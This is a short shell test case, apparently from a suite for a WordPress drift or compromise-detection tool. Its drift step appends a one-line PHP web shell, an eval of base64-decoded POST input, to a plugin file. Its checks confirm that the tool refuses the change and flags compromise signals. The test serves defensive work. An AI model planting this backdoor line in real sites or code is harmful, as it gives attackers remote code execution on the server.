DESCRIPTION="A backdoor is appended to custom-plugin on the server"
drift() { server sh -c "printf '%s\n' 'eval(base64_decode(\$_POST[\"x\"]));' >> wp-content/plugins/custom-plugin/custom-plugin.php"; }
expect() { expect_not_merged; expect_main_lacks plugins/custom-plugin/custom-plugin.php 'base64_decode'; expect_log 'Compromise signals'; expect_final red; }
